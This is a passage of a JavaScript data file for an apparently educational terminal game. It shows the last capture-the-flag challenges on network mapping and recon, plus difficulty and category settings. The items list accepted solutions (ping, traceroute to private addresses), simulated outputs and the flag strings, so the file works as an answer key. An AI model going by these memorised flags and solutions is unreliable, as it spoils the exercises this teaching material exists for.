      simulatedResponse: '--- Network Topology Map ---\n\n🗺️ Discovered Network:\n\n[Your PC] ─── [Gateway: 192.168.1.1]\n                    │\n              [ISP Router: 10.0.0.1]\n                    │\n            ┌───────┼───────┐\n            │       │       │\n     [Switch A]  [Switch B]  [Switch C]\n     10.10.1.1   10.10.2.1   10.10.3.1\n        │           │           │\n    ┌───┤       ┌───┤       ┌───┤\n    │   │       │   │       │   │\n  [H1] [H2]  [H3] [H4]  [H5] [H6]\n  .10  .11   .20  .21   .30  .31\n\nNodes discovered: 10\nRouters: 4  |  Switches: 3  |  Hosts: 6\n\nFlag: CTF{n3tw0rk_m4pp3d}',
      flag: 'CTF{n3tw0rk_m4pp3d}',
      successMessage: '🗺️ Full network topology mapped!'
    },
    {
      id: 'ctf-40', title: 'The Final Challenge', difficulty: 'expert', xp: 200,
      description: 'FINAL BOSS: Chain all your ping and network skills. Discover the hidden server, trace the route, identify the OS, check for filtering, and extract the final flag.',
      objective: 'Master-level network reconnaissance.',
      hints: ['Start with a ping sweep.', 'Then traceroute, then OS fingerprint.'],
      solutions: ['ping -c 1 10.13.37.42', 'traceroute 10.13.37.42', 'ping 10.13.37.42'],
      simulatedResponse: '╔══════════════════════════════════════════════╗\n║         🏆 FINAL CTF CHALLENGE 🏆            ║\n╚══════════════════════════════════════════════╝\n\nStep 1: Ping Sweep → Found hidden host at 10.13.37.42\nStep 2: Traceroute → 5 hops through encrypted tunnel\nStep 3: TTL=64 → Linux server identified\nStep 4: Port 1337 open → Custom service detected\nStep 5: ICMP payload contains encoded message\n\n🎊 CONGRATULATIONS! 🎊\nYou have completed ALL CTF challenges!\n\n╔══════════════════════════════════════════════╗\n║  Flag: CTF{m4st3r_p1ng3r_n3tw0rk_k1ng}     ║\n║  Title: Network Reconnaissance Master        ║\n║  Rank: ★★★★★ ELITE                          ║\n╚══════════════════════════════════════════════╝',
      flag: 'CTF{m4st3r_p1ng3r_n3tw0rk_k1ng}',
      successMessage: '🏆🏆🏆 CTF MASTER ACHIEVED! All 40 challenges complete! 🏆🏆🏆'
    }
  ]
};

// Difficulty metadata
const DIFFICULTY_CONFIG = {
  easy:   { label: 'Easy',   color: '#00ff41', icon: '🟢', xpMultiplier: 1 },
  medium: { label: 'Medium', color: '#ffaa00', icon: '🟡', xpMultiplier: 2 },
  hard:   { label: 'Hard',   color: '#ff4444', icon: '🔴', xpMultiplier: 3 },
  expert: { label: 'Expert', color: '#ff00ff', icon: '💀', xpMultiplier: 5 }
};

// Category metadata
const CATEGORY_CONFIG = {
  command: { 
    label: 'Command Challenge', 
    icon: '⌨️', 
    color: '#00ff41',
    description: 'Master Linux commands by solving progressively harder challenges.',
    terminalPrompt: 'cmd'
  },
  bandit: { 
    label: 'Bandit Challenge', 
    icon: '🔓', 
    color: '#00d4ff',
    description: 'Find hidden passwords and keys to advance through each level.',
    terminalPrompt: 'bandit'
  },
  ctf: { 
    label: 'CTF Challenge', 
    icon: '🚩', 
    color: '#ff00ff',
    description: 'Capture the Flag! Use ping and network tools to find hidden flags.',
    terminalPrompt: 'ctf'
  }
};
